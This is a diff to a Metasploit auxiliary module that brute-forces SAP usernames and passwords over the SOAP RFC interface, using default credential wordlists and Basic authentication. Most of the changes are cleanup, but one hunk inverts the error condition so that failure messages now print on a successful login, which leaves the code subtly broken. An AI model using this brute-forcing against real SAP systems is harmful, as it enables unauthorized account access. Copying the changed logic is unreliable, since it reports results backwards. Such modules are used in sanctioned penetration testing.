@@ -1,18 +1,18 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
 ##
 
 ##
-# This module is based on, inspired by, or is a port of a plugin available in 
-# the Onapsis Bizploit Opensource ERP Penetration Testing framework - 
+# This module is based on, inspired by, or is a port of a plugin available in
+# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
 # http://www.onapsis.com/research-free-solutions.php.
-# Mariano Nuñez (the author of the Bizploit framework) helped me in my efforts
+# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
 # in producing the Metasploit modules and was happy to share his knowledge and
-# experience - a very cool guy. I'd also like to thank Chris John Riley, 
-# Ian de Villiers and Joris van de Vis who have Beta tested the modules and 
+# experience - a very cool guy. I'd also like to thank Chris John Riley,
+# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
 # provided excellent feedback. Some people just seem to enjoy hacking SAP :)
 ##
 
@@ -28,20 +28,20 @@ class Metasploit4 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name' => 'SAP SOAP RFC Brute Forcer (via RFC_PING)',
-			'Version' => '$Revision$',
 			'Description' => %q{
-				This module attempts to brute force the username | password via an RFC interface (over SOAP).
-				Default clients can be tested without needing to set a CLIENT.
-				Common/Default user and password combinations can be tested without needing to set a USERNAME, PASSWORD, USER_FILE or PASS_FILE.
-				The default usernames and password combinations are stored in ./data/wordlists/sap_default.txt.
+				This module attempts to brute force the username | password via an RFC
+				interface (over SOAP). Default clients can be tested without needing to set a
+				CLIENT. Common/Default user and password combinations can be tested without needing
+				to set a USERNAME, PASSWORD, USER_FILE or PASS_FILE. The default usernames and
+				password combinations are stored in ./data/wordlists/sap_default.txt.
 				},
-			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
+			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]],
 			'Author' => [ 'Agnivesh Sathasivam','nmonkee' ],
 			'License' => BSD_LICENSE
 			)
 		register_options([
-			OptEnum.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
-			OptBool.new('DEFAULT_CRED',[false, 'Check using the defult password and username',true]),
+			OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
+			OptBool.new('DEFAULT_CRED',[false, 'Check using the defult password and username',true])
 			], self.class)
 		register_autofilter_ports([ 8000 ])
 	end
@@ -86,8 +86,8 @@ class Metasploit4 < Msf::Auxiliary
 			credentials.each do |u, p|
 				client.each do |cli|
 					success = bruteforce(u, p, cli)
-					if success == true
-						saptbl << [ datastore['RHOST'], datastore['RPORT'], cli, u, p]
+					if success
+						saptbl << [ rhost, rport, cli, u, p]
 					end
 				end
 			end
@@ -95,8 +95,8 @@ class Metasploit4 < Msf::Auxiliary
 			each_user_pass do |u, p|
 				client.each do |cli|
 					success = bruteforce(u, p, cli)
-					if success == true
-						saptbl << [ datastore['RHOST'], datastore['RPORT'], cli, u, p]
+					if success
+						saptbl << [ rhost, rport, cli, u, p]
 					end
 				end
 			end
@@ -128,26 +128,24 @@ class Metasploit4 < Msf::Auxiliary
 					'Authorization' => 'Basic ' + user_pass,
 					'Content-Type' => 'text/xml; charset=UTF-8'}
 					}, 45)
-			if res.code == 401
+			if res and res.code == 401
 				success = false
 				return success
-			elsif res.code == 500
+			elsif res and res.code == 500
 				response = res.body
 				error.push(response.scan(%r{<faultstring>(.*?)</faultstring>}))
 				error.push(response.scan(%r{<message>(.*?)</message>}))
 				success = false
-			elsif res.code == 200
+			elsif res and res.code == 200
 				success = true
 				return success
-			elsif res.body =~ /Response/
-				#puts res
 			end
-			if success == false
-				err = error.join().chomp
-				print_error("#{datastore['RHOSTS']}:#{datastore['RPORT']} -#{err} - #{client}:#{username}:#{password}")
+			if success
+				err = error.join.chomp
+				print_error("[SAP] #{rhost}:#{rport} - #{err} - #{client}:#{username}:#{password}")
 			end
 			rescue ::Rex::ConnectionError
-				print_error("#{datastore['RHOST']}:#{datastore['RPORT']} - Unable to connect")
+				print_error("[SAP] #{rhost}:#{rport} - Unable to connect")
 				return
 			end
 		end
